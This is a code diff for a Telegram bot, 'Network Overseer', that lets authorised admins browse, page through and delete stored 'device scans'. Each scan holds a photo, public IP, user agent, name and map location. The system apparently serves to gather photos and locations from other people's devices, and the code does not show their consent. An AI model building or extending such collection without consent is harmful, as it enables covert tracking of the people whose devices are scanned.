@@ -40,6 +40,14 @@ export async function POST(req: Request) {
       });
     };
 
+    const editMessage = async (msgId: string, msg: string, reply_markup?: any) => {
+      await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, message_id: msgId, text: msg, parse_mode: 'Markdown', reply_markup })
+      });
+    };
+
     const sendPhoto = async (base64Image: string, caption: string) => {
       try {
         const base64Data = base64Image.replace(/^data:image\/\w+;base64,/, "");
@@ -68,7 +76,7 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: true });
     }
 
-    const args = text.split(/[ _]+/); // support split by space or underscore for callback data
+    const args = text.split(/[ _]+/);
     const command = args[0].toLowerCase();
 
     if (command === '/login') {
@@ -107,7 +115,7 @@ export async function POST(req: Request) {
 
     // Check Authorization
     let isAuthorized = envAllowedChatIds.includes(chatId);
-    let userRole = isAuthorized ? "superadmin" : "viewer"; // Default env ID to superadmin
+    let userRole = isAuthorized ? "superadmin" : "viewer"; 
     const dbUser = await prisma.telegramUser.findUnique({ where: { chatId } });
     if (dbUser) {
       isAuthorized = true;
@@ -119,8 +127,7 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: true });
     }
 
-    // Roles: superadmin, admin, viewer
-    if (command === '/devices' || command === 'devices') {
+    const showMainMenu = async () => {
       const scans = await prisma.deviceScan.findMany({
         select: { deviceId: true, publicIp: true, userAgent: true, userName: true }
       });
@@ -138,27 +145,61 @@ export async function POST(req: Request) {
       if (devicesMap.size === 0) {
         await sendMessage("No devices found in the database.");
       } else {
-        await sendMessage(`*📡 Connected Devices (${devicesMap.size})*\nTap a button below to manage a device:`);
-        
-        for (const [id, data] of devicesMap.entries()) {
+        let buttons = [];
+        devicesMap.forEach((data, id) => {
           const shortId = id.substring(0, 8);
-          const msg = `*${data.name || 'Unknown'}*\nIP: \`${data.ip || 'Unknown'}\`\nScans: ${data.count}`;
-          
-          const buttons = [
-            { text: '📸 Photos (3)', callback_data: `photos_${shortId}_3` },
-            { text: '📸 Photos (10)', callback_data: `photos_${shortId}_10` }
-          ];
-          
-          if (userRole === "superadmin" || userRole === "admin") {
-            buttons.push({ text: '❌ Delete', callback_data: `delete_${shortId}` });
-          }
-
-          await sendMessage(msg, {
-            inline_keyboard: [ buttons ]
-          });
-        }
+          buttons.push([{ text: `🖥️ ${data.name || data.ip} (${data.count} scans)`, callback_data: `menu_${shortId}` }]);
+        });
+        
+        await sendMessage(`*📡 Connected Devices (${devicesMap.size})*\nSelect a device to manage:`, { inline_keyboard: buttons });
       }
+    };
+
+    const showDeviceMenu = async (shortId: string, messageIdToEdit?: string) => {
+      const scan = await prisma.deviceScan.findFirst({
+        where: { deviceId: { startsWith: shortId } },
+        orderBy: { createdAt: 'desc' }
+      });
+      
+      if (!scan) {
+        await sendMessage(`❌ Device \`${shortId}\` not found.`);
+        return;
+      }
+      
+      const totalPhotos = await prisma.deviceScan.count({ where: { deviceId: scan.deviceId, image: { not: null } } });
+      const totalScans = await prisma.deviceScan.count({ where: { deviceId: scan.deviceId } });
+      
+      let locStr = "Unknown";
+      if (scan.latitude && scan.longitude) {
+        locStr = `[Map](https://maps.google.com/?q=${scan.latitude},${scan.longitude})`;
+      }
+
+      const msg = `*📱 Device Details*\n\n*Name:* ${scan.userName || 'Unknown'}\n*IP:* \`${scan.publicIp || 'Unknown'}\`\n*OS:* ${scan.userAgent?.substring(0, 40) || 'Unknown'}\n*Location:* ${locStr}\n*Scans:* ${totalScans}\n*Photos Stored:* ${totalPhotos}`;
+      
+      const buttons = [
+        [{ text: '📸 Photos (3)', callback_data: `photos_${shortId}_0_3` }, { text: '📸 Photos (10)', callback_data: `photos_${shortId}_0_10` }]
+      ];
+      
+      if (userRole === "superadmin" || userRole === "admin") {
+        buttons.push([{ text: '🧹 Clear Old Photos (Keep 1)', callback_data: `clean_${shortId}` }]);
+        buttons.push([{ text: '❌ Delete Entire Device', callback_data: `delete_${shortId}` }]);
+      }
+      
+      buttons.push([{ text: '🏠 Main Menu', callback_data: 'main_menu' }]);
+
+      if (messageIdToEdit && body.callback_query) {
+        await editMessage(body.callback_query.message.message_id.toString(), msg, { inline_keyboard: buttons });
+      } else {
+        await sendMessage(msg, { inline_keyboard: buttons });
+      }
+    };
+
+    if (command === '/devices' || command === 'devices' || command === 'main') {
+      await showMainMenu();
     } 
+    else if (command === 'menu') {
+      await showDeviceMenu(args[1], body.callback_query?.message?.message_id?.toString());
+    }
     else if (command === '/delete' || command === 'delete') {
       if (userRole !== "superadmin" && userRole !== "admin") {
         await sendMessage("⛔ Permission denied. You don't have delete access.");
@@ -179,14 +220,48 @@ export async function POST(req: Request) {
         });
         if (deleted.count > 0) {
           await sendMessage(`✅ Successfully deleted device \`${deviceIdToDelete.substring(0, 8)}...\` and all ${deleted.count} scans.`);
+          await showMainMenu();
         } else {
           await sendMessage(`❌ Device starting with \`${deviceIdToDelete}\` not found.`);
         }
       }
     }
+    else if (command === 'clean') {
+      if (userRole !== "superadmin" && userRole !== "admin") {
+        await sendMessage("⛔ Permission denied.");
+        return NextResponse.json({ success: true });
+      }
+      
+      let deviceId = args[1];
+      const latestScan = await prisma.deviceScan.findFirst({
+        where: { deviceId: { startsWith: deviceId }, image: { not: null } },
+        orderBy: { createdAt: 'desc' }
+      });
+      
+      if (!latestScan) {
+        await sendMessage("No photos found to clean.");
+      } else {
+        const fullId = latestScan.deviceId;
+        // Nullify all other images to save space
+        const updated = await prisma.deviceScan.updateMany({
+          where: { deviceId: fullId, id: { not: latestScan.id }, image: { not: null } },
+          data: { image: null }
+        });
+        await sendMessage(`✅ Cleaned up ${updated.count} old photos to free up storage!`);
+        await showDeviceMenu(args[1]);
+      }
+    }
     else if (command === '/photos' || command === 'photos') {
       let deviceId = args[1];
-      let amount = parseInt(args[2]) || 3;
+      let skip = parseInt(args[2]) || 0;
+      let take = parseInt(args[3]) || 3;
+      
+      // If triggered manually without skip/take args like "/photos id 10"
+      if (!args[3] && args[2] && !body.callback_query) {
+        skip = 0;
+        take = parseInt(args[2]);
+      }
+
       if (!deviceId) {
         await sendMessage("Please provide a Device ID: `/photos <shortId> [amount]`");
       } else {
@@ -198,18 +273,29 @@ export async function POST(req: Request) {
         const scansWithPhotos = await prisma.deviceScan.findMany({
           where: { deviceId, image: { not: null } },
           orderBy: { createdAt: 'desc' },
-          take: amount
+          skip,
+          take
         });
         
         if (scansWithPhotos.length === 0) {
-          await sendMessage(`No photos found for device \`${deviceId.substring(0, 8)}...\`.`);
+          await sendMessage(`No photos found in this range for \`${deviceId.substring(0, 8)}...\`.`);
         } else {
-          await sendMessage(`Sending ${scansWithPhotos.length} recent photos for \`${deviceId.substring(0, 8)}...\``);
+          await sendMessage(`Sending ${scansWithPhotos.length} photos (Skip: ${skip})...`);
           for (const scan of scansWithPhotos) {
             if (scan.image) {
               await sendPhoto(scan.image, `Scan from ${scan.createdAt.toISOString()}`);
             }
           }
+          
+          // Show options to fetch more
+          const nextSkip = skip + take;
+          const shortId = deviceId.substring(0, 8);
+          await sendMessage(`*What's next?*`, {
+            inline_keyboard: [
+              [{ text: `📸 Fetch Next 10`, callback_data: `photos_${shortId}_${nextSkip}_10` }, { text: `📸 Fetch Next 50`, callback_data: `photos_${shortId}_${nextSkip}_50` }],
+              [{ text: '« Back to Device', callback_data: `menu_${shortId}` }, { text: '🏠 Main Menu', callback_data: 'main_menu' }]
+            ]
+          });
         }
       }
     }
@@ -287,12 +373,10 @@ export async function POST(req: Request) {
       await sendMessage(`*📡 Network Overseer Bot Commands*
       
 /devices - Interactive list of devices
-/photos \`<shortId>\` \`<amount>\` - Get photos (defaults to 3)
 /storage - Check DB usage (SuperAdmin)
-/delete \`<shortId>\` - Delete a device (Admin)
 /users - List admin users (SuperAdmin)
-/createuser \`<name>\` \`<pass>\` - Create user (SuperAdmin)
-/deleteuser \`<name>\` - Delete user (SuperAdmin)`);
+/createuser \`<name>\` \`<pass>\` - Create user
+/deleteuser \`<name>\` - Delete user`);
     }
 
     return NextResponse.json({ success: true });
